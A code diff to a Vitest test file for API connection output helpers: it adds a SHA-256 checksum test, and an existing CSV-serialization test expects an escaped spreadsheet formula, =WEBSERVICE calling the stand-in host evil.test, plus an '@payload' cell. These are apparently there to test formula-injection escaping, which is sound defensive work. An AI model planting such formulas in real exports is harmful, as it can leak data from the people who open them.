@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 
 import {
+  checksumApiConnectionArtifact,
   parseApiConnectionRowsArtifact,
   serializeApiConnectionRawResponseArtifact,
   serializeApiConnectionRowsArtifact,
@@ -20,6 +21,15 @@ const rows = [
 ];
 
 describe("API connection output helpers", () => {
+  it("produces deterministic SHA-256 artifact checksums", () => {
+    expect(checksumApiConnectionArtifact("artifact")).toBe(
+      "c7c5c1d70c5dec4416ab6158afd0b223ef40c29b1dc1f97ed9428b94d4cadb1c",
+    );
+    expect(checksumApiConnectionArtifact("artifact")).toBe(
+      checksumApiConnectionArtifact("artifact"),
+    );
+  });
+
   it("serializes normalized rows as UTF-8 BOM CSV with CRLF rows", () => {
     expect(serializeApiConnectionRowsToCsv({ columns, rows })).toBe(
       `${UTF8_BOM}Name,Notes\r\nAlpha,Line one\r\nBeta,"Line ""two""\nwrapped"\r\n"'=WEBSERVICE(""https://evil.test"")",'  @payload\r\n`,
